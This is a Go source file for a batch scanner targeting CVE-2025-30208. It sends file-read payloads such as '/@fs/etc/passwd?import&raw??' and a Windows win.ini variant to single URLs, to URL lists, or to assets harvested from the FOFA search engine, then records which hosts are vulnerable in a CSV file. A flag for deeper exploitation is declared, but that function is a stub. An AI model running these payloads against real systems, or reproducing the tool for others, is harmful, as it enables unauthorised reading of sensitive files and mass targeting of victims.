package main

import (
	"bufio"
	"encoding/csv"
	"flag"
	"fmt"
	"io"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	NeedFofa bool
	Url      string
	FileName string
	Exploit  bool
)

func init() {
	flag.BoolVar(&NeedFofa, "fofa", false, "确认是否需要fofa")
	flag.StringVar(&Url, "url", "", "检测存在漏洞的url")
	flag.StringVar(&Url, "u", "", "检测存在漏洞的url")
	flag.StringVar(&FileName, "filename", "", "批量检测文件")
	flag.StringVar(&FileName, "f", "", "批量检测文件")
	flag.BoolVar(&Exploit, "e", false, "是否深度利用漏洞(谨慎使用)")
	flag.Parse()
}

func (target Target) check_CVE_2025_30208() (platform string, isVul bool) {
	INFO("[*] 检测目标：%s是否存在CVE_2025_30208\n", target.Url)
	nixPayload := "/@fs/etc/passwd?import&raw??"
	winPayload := "/@fs/C://Windows/win.ini?import&raw??"
	resp1, err := Request(target.Url + nixPayload)
	if err == nil {
		defer resp1.Body.Close()
		content, err := io.ReadAll(resp1.Body)
		if err == nil {
			if strings.Contains(string(content), "export default") {
				return "linux", true
			}
		}
	}
	resp2, err := Request(target.Url + winPayload)
	if err != nil {
		return "", false
	}
	defer resp2.Body.Close()
	content2, err := io.ReadAll(resp2.Body)
	if strings.Contains(string(content2), "export default") {
		return "windows", true
	}
	return "", false
}

// 根据相应的平台进行深度利用，比如读取敏感文件并保存到本地
func (target Target) exploit_CVE_2025_30208(platform string) {
	ERROR("[-] 还在开发中~")
}

// 为url添加http://和https://，并检查url合法性，顺便检测是否存活
func NormalizeUrl(targetUrl string) (Target, bool) {
	Port := ""
	if !strings.HasPrefix(targetUrl, "http://") && !strings.HasPrefix(targetUrl, "https://") {
		httpTargetUrl := "http://" + targetUrl
		u, err := url.Parse(httpTargetUrl)
		if err == nil {
			request, err := Request(httpTargetUrl)
			if err == nil {
				defer request.Body.Close()
				Port = u.Port()
				if Port == "" {
					Port = "80"
				}
				return Target{
					HOST:       u.Host,
					IP:         u.Host,
					Port:       Port,
					Protocal:   u.Scheme,
					Url:        httpTargetUrl,
					StatusCode: request.StatusCode,
				}, true
			}
		}
		httpsTargetUrl := "https://" + targetUrl
		u2, err := url.Parse("https://" + targetUrl)
		if err != nil {
			return Target{}, false
		}
		request2, err := Request(httpsTargetUrl)
		if err != nil {
			return Target{}, false
		}
		defer request2.Body.Close()
		Port = u.Port()
		if Port == "" {
			Port = "443"
		}
		return Target{
			HOST:       u2.Host,
			IP:         u2.Host,
			Port:       Port,
			Protocal:   u2.Scheme,
			Url:        httpsTargetUrl,
			StatusCode: request2.StatusCode,
		}, true
	}
	u, err := url.Parse(targetUrl)
	if err != nil {
		return Target{}, false
	}
	request, err := Request(targetUrl)
	if err != nil {
		return Target{}, false
	}
	defer request.Body.Close()
	if Port == "" {
		if strings.HasPrefix(targetUrl, "http://") {
			Port = "80"
		} else {
			Port = "443"
		}
	}
	return Target{
		HOST:       u.Host,
		IP:         u.Host,
		Port:       Port,
		Protocal:   u.Scheme,
		Url:        targetUrl,
		StatusCode: request.StatusCode,
	}, true
}

func saveResult(successList []Target) {
	fileName2 := fmt.Sprintf("%d", time.Now().Unix()) + ".csv"
	file2, err := os.Create(fileName2)
	if err != nil {
		ERROR("[-] 未能成功将结果输出到文件中！")
		os.Exit(1)
	}
	defer file2.Close()
	writer := csv.NewWriter(file2)
	defer writer.Flush()
	writer.Write([]string{"IP", "PORT", "URL", "Protocal"})
	for _, result := range successList {
		writer.Write([]string{result.IP, result.Port, result.Url, result.Protocal})
	}
	SUCCESS("[+] 成功将结果写入到%s文件中", fileName2)
}

func main() {
	if Url == "" && NeedFofa == false && FileName == "" {
		ERROR("请至少输入-u/-url|-fofa|-filename/-f等参数\n")
		flag.Usage()
		os.Exit(1)
	}
	if !NeedFofa {
		// 不用fofa的话，就是检测给定的一个url或者是批量检测给定文件名中的url
		if Url != "" {
			target, ok := NormalizeUrl(Url)
			if !ok {
				ERROR("[-] 请检查输入的url：%s是否正确！\n", Url)
				os.Exit(1)
			}
			platform, vul := target.check_CVE_2025_30208()
			if vul {
				SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, target.Url)
				if Exploit {
					target.exploit_CVE_2025_30208(platform)
				}
			} else {
				ERROR("[-] %s貌似不存在CVE_2025_30208漏洞？\n", target.Url)
			}
		}
		if FileName != "" {
			file, err := os.Open(FileName)
			if err != nil {
				ERROR("[-] 打开文件 %s 失败：%s。\n", FileName, err.Error())
				os.Exit(1)
			}
			successList := []Target{}
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				Url := scanner.Text()
				if Url == "" {
					continue // 处理空行
				}
				target, ok := NormalizeUrl(Url)
				if !ok {
					ERROR("[-] 请检查url：%s是否正确！\n", Url)
					continue
				}
				platform, vul := target.check_CVE_2025_30208()
				if vul {
					SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, target.Url)
					if Exploit {
						target.exploit_CVE_2025_30208(platform)
					}
					successList = append(successList, target)
				} else {
					ERROR("[-] %s貌似不存在CVE_2025_30208漏洞？\n", target.Url)
				}
			}
			if len(successList) != 0 {
				saveResult(successList)
			}
		}
	} else {
		// 联动fofa进行检测， 先从fofa中取出相应的目标资产，然后检测存活度、去重，最终利用相应的cve进行批量检测
		var assets []Target
		assets, err := GetFofaAssets()
		if err != nil {
			ERROR("[-] 出现了错误: %s\n", err.Error())
			os.Exit(1)
		}
		var successList []Target
		for _, asset := range assets {
			platform, vul := asset.check_CVE_2025_30208()
			if vul {
				SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, asset.Url)
				if Exploit {
					asset.exploit_CVE_2025_30208(platform)
				}
				successList = append(successList, asset)
			} else {
				ERROR("[-] %s貌似不存在CVE_2025_30208漏洞？\n", asset.Url)
			}
		}
		if len(successList) != 0 {
			saveResult(successList)
		}
	}
}
